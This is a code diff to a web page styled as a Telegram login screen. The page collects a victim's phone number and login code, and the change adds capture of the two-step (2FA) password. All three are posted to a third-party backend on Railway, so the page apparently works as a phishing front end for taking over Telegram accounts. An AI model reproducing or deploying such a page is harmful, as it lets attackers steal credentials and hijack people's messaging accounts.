@@ -35,17 +35,27 @@
             <button onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] text-white font-medium py-3 rounded-xl transition">SEND CODE</button>
         </div>
 
-        <!-- STEP 2: OTP Form -->
+        <!-- STEP 2: OTP & 2FA Form -->
         <div id="step-otp" class="space-y-6 hidden">
             <div class="text-5xl">🔐</div>
             <div>
                 <h2 id="display-phone" class="text-lg font-semibold mb-1"></h2>
                 <p class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
             </div>
-            <div class="text-left">
-                <label class="block text-xs text-gray-400 mb-1 ml-1">Telegram Code</label>
-                <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="tg-input w-full p-3 text-center text-xl font-mono tracking-widest">
+            
+            <div class="text-left space-y-4">
+                <div>
+                    <label class="block text-xs text-gray-400 mb-1 ml-1">Telegram Code</label>
+                    <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="tg-input w-full p-3 text-center text-xl font-mono tracking-widest">
+                </div>
+
+                <!-- Input 2FA Password (លាក់ជាមុន) -->
+                <div id="password-container" class="hidden">
+                    <label class="block text-xs text-gray-400 mb-1 ml-1">Two-Step Password (2FA)</label>
+                    <input id="password-input" type="password" placeholder="Enter your 2FA password" class="tg-input w-full p-3 text-sm">
+                </div>
             </div>
+
             <button onclick="submitOTP()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] text-white font-medium py-3 rounded-xl transition">VERIFY & LOGIN</button>
             <div>
                 <button onclick="goBack()" class="text-xs text-[#5288c1] hover:underline">Change Phone Number</button>
@@ -54,7 +64,6 @@
     </div>
 
     <script>
-        // URL របស់ Railway
         const BACKEND_URL = "https://telegram-production-6705.up.railway.app";
 
         async function sendPhone() {
@@ -88,6 +97,7 @@
         async function submitOTP() {
             const phone = document.getElementById('phone-input').value.trim();
             const code = document.getElementById('otp-input').value.trim();
+            const password = document.getElementById('password-input').value.trim();
 
             if (!code) {
                 alert('Please enter the OTP code.');
@@ -98,12 +108,20 @@
                 const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber: phone, code: code })
+                    body: JSON.stringify({ 
+                        phoneNumber: phone, 
+                        code: code,
+                        password: password || undefined
+                    })
                 });
                 const data = await res.json();
 
                 if (data.success) {
                     alert('🎉 Login Successful!');
+                } else if (data.requiresPassword) {
+                    // បង្ហាញ Input វាយ Password ប្រសិនបើ Telegram ទាមទារ 2FA
+                    document.getElementById('password-container').classList.remove('hidden');
+                    alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
                 } else {
                     alert(data.error || 'Verification failed.');
                 }
@@ -115,6 +133,9 @@
 
         function goBack() {
             document.getElementById('step-otp').classList.add('hidden');
+            document.getElementById('password-container').classList.add('hidden');
+            document.getElementById('password-input').value = '';
+            document.getElementById('otp-input').value = '';
             document.getElementById('step-phone').classList.remove('hidden');
         }
     </script>
